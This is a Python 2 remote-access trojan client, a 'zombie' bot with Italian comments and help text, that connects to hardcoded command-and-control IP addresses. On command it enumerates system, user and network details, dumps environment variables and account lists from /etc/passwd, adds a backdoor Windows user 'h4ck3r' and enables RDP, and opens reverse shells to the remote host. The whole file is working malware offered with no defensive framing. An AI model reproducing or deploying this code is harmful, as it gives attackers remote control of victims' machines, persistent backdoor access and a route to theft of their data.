#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#CLIENT CONFIGURATION DO NOT EDIT THIS
import socket,threading
import os
import random
import time
import subprocess
import platform
import psutil
host = '79.49.207.64'
port = 8888

class shelllinux():
    global host
    def shell():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        time.sleep(2)
        s.connect((host, 8887))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
        s.sendall(p)

    shell_thread = threading.Thread(target=shell)
    shell_thread.start()
def connection():
    global host
    global port
    global zombie
    global sistema
    try:
        zombie = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        zombie.connect((host,int(port)))
        sistema = platform.system()
        if sistema == 'Linux' or sistema == 'linux':
            machine = os.environ['USER']
            sistema = 'Linux'
        elif sistema == 'Windows' or sistema == 'windows':
            machine = os.environ['COMPUTERNAME']
            sistema = 'Windows'
        processore =  platform.architecture()
        if '32bit' in processore:
            processore = '32 Bit'
        else:
            processore= '64 Bit'
        zombie.sendall(machine)
    except:
        raise
        exit()

def receiver():
  try:
    global host
    global port
    global sistema
    global zombie
    commands = zombie.recv(10000)
    if commands == 'quit' or commands == 'exit' or commands == '0':
        zombie.close()
    elif commands == 'getinfos' or commands == '1':
        if sistema == 'Windows' or sistema == 'windows':
            system = "Windows {}".format(platform.version())
            user = user = os.environ['USERNAME']
        elif sistema == 'Linux':
            oss = platform.linux_distribution()
            system = "{} {}".format(oss[0],oss[1])
            user = os.environ['USER']
        else:
            system = 'Unknow system'
        processore =  platform.architecture()
        if '32bit' in processore:
            processore = '32 Bit'
        else:
            processore= '64 Bit'
        args = (" OS Infos:\t\t{}\n\tProcessor Infos:\t{}\n\tUser:\t\t\t{}".format(system,processore,user))
    elif commands == 'network' or commands == '3':
        if sistema == 'Windows' or sistema == 'windows':
            internetconfig = subprocess.Popen("ipconfig",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            out = internetconfig.stdout.read() + internetconfig.stderr.read()
        elif sistema == 'Linux':
            internetconfig = subprocess.Popen("ifconfig -a",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            out = internetconfig.stdout.read() + internetconfig.stderr.read()
        args = ( "Internet Configuration:\n "+out)
    elif commands == 'windows-rdp' or commands == '4':
        if sistema == 'Windows' or sistema == 'windows':
            if os.environ['USERNAME'] != 'SYSTEM-NT':
                args = 'We are not admin, dammit!'
            else:
                adduser = subprocess.Popen("net user h4ck3r h4ck3r /ADD",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                enablerdp = subprocess.Popen('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                action1 = adduser.stdout.read() + adduser.stderr.read()
                action2 = enablerdp.stdout.read() + enablerdp.stderr.read()
            args = action1+action2
        else:
            args = 'Non è un pc con Windows, probabilmente è Linux based'
    elif commands == 'enumerate-linux' or commands == '6':
        if sistema == 'Linux' or sistema == 'linux':
            loginssh = subprocess.Popen("grep 'PermitRootLogin ' /etc/ssh/sshd_config 2>/dev/null | grep -v '#' | awk '{print  $2}'",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            lgnssh = loginssh.stdout.read() + loginssh.stderr.read()
            if lgnssh == '':
                rootlogin = "Disabled"
            else:
                rootlogin = "Enabled : "+str(lgnssh)
            act2 = subprocess.Popen("systemctl status",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            act3 = subprocess.Popen("who -u",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            act4 = subprocess.Popen("env",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            act5 = subprocess.Popen("ls /usr/bin/*session",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            act6 = subprocess.Popen("for i in $(cat /etc/passwd 2>/dev/null| cut -d':' -f1 2>/dev/null);do id $i;done 2>/dev/null",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            a1 = rootlogin
            a2 = act2.stdout.read() + act3.stderr.read()
            a3 = act3.stdout.read() + act3.stderr.read()
            a4 = act4.stdout.read() + act4.stderr.read()
            a5 = act5.stdout.read() + act5.stderr.read()
            a6 = act6.stdout.read() + act6.stderr.read()
            out = "\nROOT LOGIN FOR SSH:\n\t{}\n SERVICES:\n\t{}\n WHO:\n\t{}\n ENVIROMENT:\n\t{}\n SESSIONS:\n\t{}\n ALL USERS:\n\t{}".format(a1,a2,a3,a4,a5,a6)
            args = out
        else:
            args = 'Non è un pc con Linux, probabilmente ha Windows'
    elif commands == 'getshell' or commands == '7':
        try:
            if sistema == 'Linux' or sistema == 'linux':
                shelllinux()
                args=""
            elif sistema == 'Windows' or sistema == 'windows':
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("87.10.76.42",8888))
                p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                try:
                	p.wait()
                except:
                	s.close()
                args=""
        except Exception as e:
            raise
        finally:
            pass
    elif commands == 'getpartitions' or commands == '2':
        try:
            parts = psutil.disk_partitions()
            x = 0
            disks = []
            types = []
            while x < len(parts):
                disks.append(parts[x][0])
                types.append(parts[x][2])
                x = x + 1
            args=("System Partitions:\n- {}\n- {}".format(disks,types))
        except:
            raise
            pass
    elif commands == 'enumerate-win' or commands == '5':
        if sistema == 'Windows' or sistema == 'windows':
            act1 = subprocess.Popen("net user",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            act2 = subprocess.Popen("net start",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            act3 = subprocess.Popen("systeminfo",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            a1 = act1.stdout.read() + act1.stderr.read()
            a2 = act2.stdout.read() + act3.stderr.read()
            a3 = act3.stdout.read() + act3.stderr.read()
            out = " USER:\n\t{}\n SERVICES:\n\t{}\n SYS INFOS:\n\t{}".format(a1,a2,a3)
            args = out
        else:
            args = 'Non è un pc con Windows, probabilmente è Linux based'
    elif commands == 'help' or commands == 'h' or commands == 'H' or commands == '?':
        args = 'Comandi:\n[1] getinfos\t\t[Get system infos]\n[2] getpartitions\t[Get partition scheme]\n[3] network\t\t[Get network infos]\n[4] windows-rdp \t[try to enable RDP and crate User(only with admin privileges!)]\n[5] enumerate-win\t[Try to find all infos on Windows]\n[6] enumerate-linux\t[Try to find all infos on Linux]\n[7] drop into terminal\t[Drop to bash/cmd shell]\n[0] quit/exit'
    else:
        args = 'Comando insesistente, ecco la lista dei comandi:\n[1] getinfos\t\t[Get system infos]\n[2] getpartitions\t[Get partition scheme]\n[3] network\t\t[Get network infos]\n[4] windows-rdp \t[try to enable RDP and crate User(only with admin privileges!)]\n[5] enumerate-win\t[Try to find all infos on Windows]\n[6] enumerate-linux\t[Try to find all infos on Linux]\n[7] drop into terminal\t[Drop to bash/cmd shell]\n[0] quit/exit'
    send(str(args))
  except:
      raise
      pass

def send(args):
    send = zombie.sendall(args)
    receiver()

try:
    connection()
    receiver()
    zombie.close()
except:
    raise
    exit()
